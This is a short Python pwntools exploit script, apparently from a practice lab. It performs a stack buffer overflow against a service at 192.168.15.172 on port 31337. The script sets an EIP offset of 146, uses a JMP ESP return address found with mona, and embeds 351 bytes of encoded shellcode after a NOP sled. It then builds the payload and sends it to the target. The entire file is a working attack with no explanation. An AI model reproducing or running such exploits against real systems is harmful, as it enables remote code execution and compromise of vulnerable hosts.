from pwn import * 

ip = "192.168.15.172"
port = 31337 

offset_to_eip = 146 #pwn cyclic -l 616d6261
offset_to_esp = 150 #pwn cyclic -l abna, eip as cafebabe to test
new_eip =  0x080414c3 #!mona jmp -r esp 0x080414c3 0x080416BF

#351 bytes
shellcode =  b"\x90"*16
shellcode += b"\xd9\xcf\xb8\x42\xd9\xf4\x27\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x47\x17\x03\x47\x17"
shellcode += b"\x83\xad\x25\x16\xd2\xcd\x3e\x55\x1d\x2d\xbf"
shellcode += b"\x3a\x97\xc8\x8e\x7a\xc3\x99\xa1\x4a\x87\xcf"
shellcode += b"\x4d\x20\xc5\xfb\xc6\x44\xc2\x0c\x6e\xe2\x34"
shellcode += b"\x23\x6f\x5f\x04\x22\xf3\xa2\x59\x84\xca\x6c"
shellcode += b"\xac\xc5\x0b\x90\x5d\x97\xc4\xde\xf0\x07\x60"
shellcode += b"\xaa\xc8\xac\x3a\x3a\x49\x51\x8a\x3d\x78\xc4"
shellcode += b"\x80\x67\x5a\xe7\x45\x1c\xd3\xff\x8a\x19\xad"
shellcode += b"\x74\x78\xd5\x2c\x5c\xb0\x16\x82\xa1\x7c\xe5"
shellcode += b"\xda\xe6\xbb\x16\xa9\x1e\xb8\xab\xaa\xe5\xc2"
shellcode += b"\x77\x3e\xfd\x65\xf3\x98\xd9\x94\xd0\x7f\xaa"
shellcode += b"\x9b\x9d\xf4\xf4\xbf\x20\xd8\x8f\xc4\xa9\xdf"
shellcode += b"\x5f\x4d\xe9\xfb\x7b\x15\xa9\x62\xda\xf3\x1c"
shellcode += b"\x9a\x3c\x5c\xc0\x3e\x37\x71\x15\x33\x1a\x1e"
shellcode += b"\xda\x7e\xa4\xde\x74\x08\xd7\xec\xdb\xa2\x7f"
shellcode += b"\x5d\x93\x6c\x78\xa2\x8e\xc9\x16\x5d\x31\x2a"
shellcode += b"\x3f\x9a\x65\x7a\x57\x0b\x06\x11\xa7\xb4\xd3"
shellcode += b"\xb6\xf7\x1a\x8c\x76\xa7\xda\x7c\x1f\xad\xd4"
shellcode += b"\xa3\x3f\xce\x3e\xcc\xaa\x35\xa9\x33\x82\x3a"
shellcode += b"\x7c\xdc\xd1\x44\x6f\x40\x5f\xa2\xe5\x68\x09"
shellcode += b"\x7d\x92\x11\x10\xf5\x03\xdd\x8e\x70\x03\x55"
shellcode += b"\x3d\x85\xca\x9e\x48\x95\xbb\x6e\x07\xc7\x6a"
shellcode += b"\x70\xbd\x6f\xf0\xe3\x5a\x6f\x7f\x18\xf5\x38"
shellcode += b"\x28\xee\x0c\xac\xc4\x49\xa7\xd2\x14\x0f\x80"
shellcode += b"\x56\xc3\xec\x0f\x57\x86\x49\x34\x47\x5e\x51"
shellcode += b"\x70\x33\x0e\x04\x2e\xed\xe8\xfe\x80\x47\xa3"
shellcode += b"\xad\x4a\x0f\x32\x9e\x4c\x49\x3b\xcb\x3a\xb5"
shellcode += b"\x8a\xa2\x7a\xca\x23\x23\x8b\xb3\x59\xd3\x74"
shellcode += b"\x6e\xda\xf3\x96\xba\x17\x9c\x0e\x2f\x9a\xc1"
shellcode += b"\xb0\x9a\xd9\xff\x32\x2e\xa2\xfb\x2b\x5b\xa7"
shellcode += b"\x40\xec\xb0\xd5\xd9\x99\xb6\x4a\xd9\x8b"


payload = fit({
	offset_to_eip:new_eip,
	offset_to_esp:shellcode,
	}, length=1000)

print(payload)
conn = remote(ip,port)
conn.sendline(payload)